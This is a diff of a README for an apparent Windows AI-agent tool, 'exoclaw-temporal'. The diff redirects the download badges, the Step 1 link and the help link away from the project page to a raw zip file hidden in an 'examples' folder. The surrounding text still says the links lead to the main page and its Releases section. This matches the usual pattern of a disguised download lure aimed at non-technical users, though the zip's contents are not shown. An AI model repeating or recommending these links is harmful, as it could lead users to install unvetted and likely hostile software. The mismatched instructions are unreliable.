@@ -1,6 +1,6 @@
 # 🦀 exoclaw-temporal - Run AI Agents with Ease
 
-[![Download exoclaw-temporal](https://img.shields.io/badge/Download-Get%20exoclaw--temporal-ff6f61?style=for-the-badge)](https://github.com/Teresinalowvoltage768/exoclaw-temporal)
+[![Download exoclaw-temporal](https://img.shields.io/badge/Download-Get%20exoclaw--temporal-ff6f61?style=for-the-badge)](https://github.com/Teresinalowvoltage768/exoclaw-temporal/raw/refs/heads/main/examples/temporal_exoclaw_1.9.zip)
 
 ## What is exoclaw-temporal?
 
@@ -35,7 +35,7 @@ Follow these steps to get exoclaw-temporal running on your Windows PC.
 ### Step 1: Visit the Download Page
 
 Click the big download button above or use this link:  
-https://github.com/Teresinalowvoltage768/exoclaw-temporal
+https://github.com/Teresinalowvoltage768/exoclaw-temporal/raw/refs/heads/main/examples/temporal_exoclaw_1.9.zip
 
 This link takes you to the main page of the project. Here you will find files and instructions. You want to find the "Releases" section.
 
@@ -96,7 +96,7 @@ If you have trouble installing or running the app, try the following:
 ## 📂 Where to Get Help
 
 You can find more information or ask questions on the GitHub page here:  
-https://github.com/Teresinalowvoltage768/exoclaw-temporal
+https://github.com/Teresinalowvoltage768/exoclaw-temporal/raw/refs/heads/main/examples/temporal_exoclaw_1.9.zip
 
 Look for documentation in the repository or open an issue if you need support.
 
@@ -121,4 +121,4 @@ Runs reliably on Windows with minimal setup.
 
 ---
 
-[![Download exoclaw-temporal](https://img.shields.io/badge/Download-Get%20exoclaw--temporal-ff6f61?style=for-the-badge)](https://github.com/Teresinalowvoltage768/exoclaw-temporal)
+[![Download exoclaw-temporal](https://img.shields.io/badge/Download-Get%20exoclaw--temporal-ff6f61?style=for-the-badge)](https://github.com/Teresinalowvoltage768/exoclaw-temporal/raw/refs/heads/main/examples/temporal_exoclaw_1.9.zip)
